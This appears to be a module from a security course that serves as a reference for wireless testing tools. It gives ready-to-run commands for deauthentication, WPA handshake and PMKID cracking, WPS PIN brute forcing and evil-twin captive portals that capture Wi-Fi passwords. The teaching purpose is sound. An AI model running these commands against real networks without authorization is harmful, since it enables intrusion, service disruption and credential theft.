# Wireless Testing Tools

## Unit 7 - Topic 6 | Wireless Network Testing

---

## Overview

This topic provides a comprehensive reference of all major **wireless testing tools** — covering WiFi reconnaissance, WPA/WPA2 cracking, evil twin attacks, deauthentication, packet injection, and Bluetooth testing.

---

## 1. Aircrack-ng Suite

```bash
# === AIRCRACK-NG SUITE (Core WiFi Tools) ===

# AIRMON-NG — Monitor Mode Management:
sudo airmon-ng check kill      # Kill interfering processes
sudo airmon-ng start wlan0     # Enable monitor mode
sudo airmon-ng stop wlan0mon   # Disable monitor mode

# AIRODUMP-NG — Wireless Scanner:
sudo airodump-ng wlan0mon                    # Scan all
sudo airodump-ng wlan0mon -c 6               # Channel 6
sudo airodump-ng wlan0mon --bssid AA:BB... -c 6 -w capture  # Target + save
sudo airodump-ng wlan0mon --band abg         # All bands

# AIREPLAY-NG — Injection + Deauth:
sudo aireplay-ng --deauth 10 -a BSSID wlan0mon        # Deauth
sudo aireplay-ng --fakeauth 0 -a BSSID wlan0mon       # Fake auth
sudo aireplay-ng -3 -b BSSID wlan0mon                  # ARP replay
sudo aireplay-ng --test wlan0mon                        # Test injection

# AIRCRACK-NG — Password Cracker:
aircrack-ng capture.cap -w rockyou.txt       # WPA dictionary
aircrack-ng capture.cap                       # WEP (auto)

# AIRDECAP-NG — Decrypt Captures:
airdecap-ng -w PASSWORD capture.cap           # Decrypt WPA pcap
airdecap-ng -e SSID -p PASSWORD capture.cap   # With SSID
```

---

## 2. Reconnaissance Tools

| Tool | Purpose | Command |
|------|---------|---------|
| **airodump-ng** | WiFi scanning | `airodump-ng wlan0mon` |
| **Kismet** | Multi-protocol scanner | `kismet -c wlan0mon` |
| **wash** | WPS detection | `wash -i wlan0mon` |
| **WiFi Analyzer** | Channel/signal analysis | Android app |
| **LinSSID** | GUI WiFi scanner | `linssid` |
| **iw** | WiFi interface control | `iw dev wlan0 scan` |

---

## 3. Attack Frameworks

```bash
# === WIFITE (Automated WiFi Auditing) ===
sudo wifite --kill
# Auto-scans, selects targets, runs attacks
# Supports: WPA, WPA2, WPS, WEP
# Captures handshakes, cracks, reports

# === FLUXION (Evil Twin + Captive Portal) ===
sudo fluxion
# Automated evil twin with password verification
# Creates fake AP + captive portal
# Captures and verifies WiFi passwords

# === WIFIPHISHER (Social Engineering WiFi) ===
sudo wifiphisher -aI wlan0 -eI wlan1 --essid TARGET
# Evil twin + phishing scenarios
# Built-in templates for credential capture

# === AIRGEDDON (All-in-One) ===
sudo airgeddon
# Menu-driven framework covering:
# Handshake capture, evil twin, WPS, DoS
# Offline cracking integration

# === BETTERCAP (Network + WiFi) ===
sudo bettercap -iface wlan0mon
wifi.recon on                    # Discover networks
wifi.deauth AA:BB:CC:DD:EE:FF   # Deauth AP
wifi.show                        # Show results
ble.recon on                     # BLE scanning
```

---

## 4. Cracking and Analysis Tools

```bash
# === HASHCAT (GPU WPA Cracking) ===
# Convert capture:
hcxpcapngtool -o hash.hc22000 capture.pcap
# Crack:
hashcat -m 22000 hash.hc22000 rockyou.txt

# === HCXDUMPTOOL (PMKID Capture) ===
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng \
  --enable_status=1
# Captures PMKID from APs

# === JOHN THE RIPPER ===
aircrack-ng capture.cap -J hash
john --wordlist=rockyou.txt hash.hccap

# === WIRESHARK (Packet Analysis) ===
wireshark capture.pcap
# Filters:
# wlan.fc.type == 0    — Management frames
# wlan.fc.type == 1    — Control frames
# wlan.fc.type == 2    — Data frames
# eapol                — Handshake packets

# === REAVER (WPS PIN Brute Force) ===
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
# Brute forces WPS PIN (11,000 combinations)
# Takes 4-10 hours typically

# === BULLY (WPS Alternative) ===
bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6
# Alternative WPS bruteforcer
```

---

## 5. Tool Selection Guide

```
WHICH TOOL FOR WHICH TASK?

RECONNAISSANCE:
├── Quick scan → airodump-ng
├── Detailed analysis → Kismet
├── WPS detection → wash
└── BLE devices → bettercap

WPA/WPA2 CRACKING:
├── Capture handshake → airodump-ng + aireplay-ng
├── Capture PMKID → hcxdumptool
├── CPU cracking → aircrack-ng
├── GPU cracking → Hashcat (-m 22000)
└── Automated → wifite

EVIL TWIN:
├── Quick + verification → Fluxion
├── Social engineering → Wifiphisher
├── Enterprise (802.1X) → EAPHammer
└── Manual control → hostapd + dnsmasq

WPS ATTACKS:
├── Primary → Reaver
├── Alternative → Bully
└── Detection → wash

DEAUTHENTICATION:
├── Targeted → aireplay-ng
├── Mass deauth → mdk4
└── Integrated → bettercap

BLUETOOTH:
├── Scanning → hcitool, bluetoothctl
├── BLE enum → bettercap, gatttool
├── Sniffing → Ubertooth
└── BLE hijack → btlejack
```

---

## Summary Table

| Tool | Type | Best For |
|------|------|---------|
| **aircrack-ng suite** | Comprehensive | Core WiFi testing |
| **Hashcat** | Cracking | GPU WPA cracking |
| **Wifite** | Automated | Quick WiFi auditing |
| **Fluxion** | Evil twin | Captive portal attack |
| **Bettercap** | Framework | WiFi + BLE + network |
| **Reaver** | WPS | WPS PIN brute force |

---

## Quick Revision Questions

1. **What tools make up the aircrack-ng suite?**
2. **When should you use Hashcat vs aircrack-ng for WPA cracking?**
3. **What is the best tool for automated WiFi testing?**
4. **Which tool is designed for WPS PIN brute force?**
5. **What framework supports both WiFi and Bluetooth testing?**

---

[← Previous: Bluetooth Security](05-bluetooth-security.md)

---

*Unit 7 - Topic 6 of 6 | [Back to README](../README.md) | [Next Unit: Network Exploitation Frameworks →](../08-Network-Exploitation-Frameworks/01-metasploit-basics.md)*
